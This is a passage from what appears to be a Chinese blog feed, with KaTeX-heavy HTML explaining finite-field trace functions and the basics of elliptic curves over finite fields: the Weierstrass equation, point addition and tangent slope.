</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.26548em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935428571428571em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.03853em;vertical-align:-0.3551999999999999em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord cjk_fallback">在</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">迹</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">为</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.03853em;vertical-align:-0.3551999999999999em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.797722em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0369199999999998em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0369199999999998em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.03853em;vertical-align:-0.3551999999999999em;"></span><span class="mord cjk_fallback">若</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">绝</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">迹</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">简</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">位</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>​	并且迹函数具有分配律、结合律的性质</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>特殊地，</mtext><mi>T</mi><msub><mi>r</mi><mrow><mi>F</mi><mi mathvariant="normal">/</mi><mi>K</mi><mo stretchy="false">(</mo><msup><mi>α</mi><mi>q</mi></msup><mo stretchy="false">)</mo></mrow></msub><mo>=</mo><mi>T</mi><msub><mi>r</mi><mrow><mi>F</mi><mi mathvariant="normal">/</mi><mi>K</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">特殊地，Tr_{F/K(\alpha^q)}=Tr_{F/K(\alpha)}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.03853em;vertical-align:-0.3551999999999999em;"></span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">殊</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935428571428571em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.03853em;vertical-align:-0.3551999999999999em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<h3 id="半分点法进行点压缩"><a class="anchor" href="#半分点法进行点压缩">#</a> 半分点法进行点压缩</h3>
<p>​	半分点算法用来计算在 F_<ruby>2<rp>(</rp><rt>n</rt><rp>)</rp></ruby> 上的椭圆曲线的点乘（[k] P）是特别有效的</p>
<p>​</p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>椭圆曲线</tag>
      </tags>
  </entry>
  <entry>
    <title>有限域上的椭圆曲线点群与椭圆曲线密码算术</title>
    <url>/number/math/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/</url>
    <content><![CDATA[<p>椭圆曲线密码的出现代表：可以使用比 RSA 短的多的密钥得到相同的安全性，减少处理负荷。</p>
<p><a id="more"></a></p>
<h2 id="椭圆曲线方程"><a class="anchor" href="#椭圆曲线方程">#</a> 椭圆曲线方程</h2>
<p>椭圆曲线的形状并不是椭圆的。只是因为椭圆曲线的描述方程，类似于计算椭圆周长的方程</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">y^2=x^3+ax+b
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/f6425235592fea56.png" alt="" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/20b62903accdc771.png" alt="" /></p>
<p>椭圆曲线在射影平面上需要满足 Weierstrass 方程</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mi>z</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mi>y</mi><mi>z</mi><mo>+</mo><msub><mi>a</mi><mn>3</mn></msub><mi>y</mi><msup><mi>z</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>x</mi><mn>2</mn></msup><mi>z</mi><mo>+</mo><msub><mi>a</mi><mn>4</mn></msub><mi>x</mi><msup><mi>z</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>6</mn></msub><msup><mi>z</mi><mn>3</mn></msup><mtext>是</mtext><mi>W</mi><mi>e</mi><mi>i</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>a</mi><mi>s</mi><mi>s</mi><mtext>方程（维尔斯特拉斯，</mtext><mi>K</mi><mi>a</mi><mi>r</mi><mi>l</mi><mi>T</mi><mi>h</mi><mi>e</mi><mi>o</mi><mi>d</mi><mi>o</mi><mi>r</mi><mi>W</mi><mi>i</mi><mi>l</mi><mi>h</mi><mi>e</mi><mi>l</mi><mi>m</mi><mi>W</mi><mi>e</mi><mi>i</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo separator="true">,</mo><mn>1815</mn><mo>−</mo><mn>1897</mn><mtext>），是一个齐次方程。</mtext></mrow><annotation encoding="application/x-tex">y^2z+a_1xyz+a_3yz^2 = x^3+a_2x^2z+a_4xz^2+a_6z^3是Weierstrass方程（维尔斯特拉斯，Karl Theodor Wilhelm Weierstrass,1815-1897），是一个齐次方程。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">维</span><span class="mord cjk_fallback">尔</span><span class="mord cjk_fallback">斯</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">拉</span><span class="mord cjk_fallback">斯</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">1</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">9</span><span class="mord">7</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">齐</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p>从曲线图我们得知<strong>椭圆曲线关于 x 轴对称</strong> *(有时也不一定)* 并且定义中还包含一个称为<strong>无穷远点或者零点的元素，极为 O</strong></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/ae2e594ee2b18f61.png" alt="" /></p>
<p>P+Q= -R，可以这么理解：这条曲线上的所有点构成了一个 Abel 群，群的性质中有一条，任意两点之和还在这个这个群里面；在曲线图形上的体现就是，<strong>任意两点的连线与曲线的另一个交点的镜像是这两个点的和。</strong></p>
<p>椭圆曲线是光滑的，所以椭圆曲线上的平常点都有切线。而切线最重要的一个参数就是斜率 k</p>
<p><em><strong>Proof</strong></em></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>求椭圆曲线方程</mtext><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mi>y</mi><mo>+</mo><msup><mi>a</mi><mn>3</mn></msup><mi>y</mi><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>4</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>6</mn></msub><mtext>上，平常点</mtext><mi>A</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mtext>的切线的斜率</mtext><mi>k</mi><mtext>。</mtext></mrow><annotation encoding="application/x-tex">求椭圆曲线方程y^2+a_1xy+a^3y=x^3+a_2x^2+a_4x+a_6上，平常点A(x,y)的切线的斜率k。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mord mathnormal" 